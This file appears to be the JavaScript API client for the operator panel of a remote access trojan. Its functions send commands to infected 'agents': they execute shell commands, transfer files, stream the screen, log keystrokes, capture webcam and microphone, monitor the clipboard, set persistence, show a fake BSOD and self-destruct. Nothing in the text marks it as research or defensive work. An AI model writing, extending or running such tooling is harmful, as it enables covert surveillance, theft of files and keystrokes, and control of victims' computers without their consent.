async function request(path, options) {
  const response = await fetch(path, options);

  if (response.status === 401 && !path.startsWith("/api/login")) {
    window.location.assign("/login.html");
    throw new Error("unauthorized");
  }

  const text = await response.text();
  let data = null;

  try {
    data = JSON.parse(text);
  } catch {}

  if (!response.ok) {
    throw new Error(data?.error || text.slice(0, 240) || `http ${response.status}`);
  }

  if (data === null) {
    throw new Error(`unexpected response: ${text.slice(0, 120)}`);
  }

  return data;
}

const query = (params) => new URLSearchParams(params).toString();

export const api = {
  session: () => request("/api/session"),
  login: (key) => request(`/api/login?${query({ key })}`, { method: "POST" }),
  logout: () => request("/api/logout", { method: "POST" }),
  keys: () => request("/api/keys"),
  createKey: (label, role) => request(`/api/keys?${query({ label, role })}`, { method: "POST" }),
  deleteKey: (key) => request(`/api/keys?${query({ key })}`, { method: "DELETE" }),

  agents: () => request("/api/agents"),
  listing: (id, path) => request(`/api/agents/${id}/ls${path ? `?${query({ path })}` : ""}`),
  downloadUrl: (id, path) => `/api/agents/${id}/get?${query({ path })}`,
  archiveUrl: (id, path) => `/api/agents/${id}/zip?${query({ path })}`,
  upload: (id, path, offset, blob) =>
    request(`/api/agents/${id}/put?${query({ path, offset })}`, { method: "POST", body: blob }),
  snapshotUrl: (id) => `/api/agents/${id}/shot?t=${Date.now()}`,
  streamUrl: (id, preset) => `/api/agents/${id}/stream?${preset}&t=${Date.now()}`,
  exec: (id, command) => request(`/api/agents/${id}/exec?${query({ cmd: command })}`),
  game: (id, action, arg) => request(`/api/agents/${id}/game?${query({ action, arg })}`),
  gameLog: async (id, bytes) => {
    const response = await fetch(`/api/agents/${id}/game?${query({ action: "log", arg: bytes })}`);
    if (!response.ok) throw new Error((await response.text()).slice(0, 200));
    return response.text();
  },
  run: (id, path, args) => request(`/api/agents/${id}/run?${query({ path, args })}`),
  bsod: (id, seconds) => request(`/api/agents/${id}/bsod?${query({ sec: seconds })}`),
  sound: (id, kind, text) => request(`/api/agents/${id}/sound?${query({ kind, text })}`),
  notify: (id, title, body) => request(`/api/agents/${id}/notify?${query({ title, body })}`),
  keylog: (id, action) => request(`/api/agents/${id}/keylog?${query({ action })}`),
  persist: (id, action, mode) => request(`/api/agents/${id}/persist?${query({ action, mode })}`),
  selfdestruct: (id) => request(`/api/agents/${id}/selfdestruct`, { method: "POST" }),
  camUrl: (id) => `/api/agents/${id}/cam?t=${Date.now()}`,
  mic: async (id, seconds) => {
    const response = await fetch(`/api/agents/${id}/mic?${query({ sec: seconds })}`);
    if (!response.ok) throw new Error((await response.text()).slice(0, 200));
    return URL.createObjectURL(await response.blob());
  },
  clip: (id, action, since = 0) => request(`/api/agents/${id}/clip?${query({ action, since })}`),
};
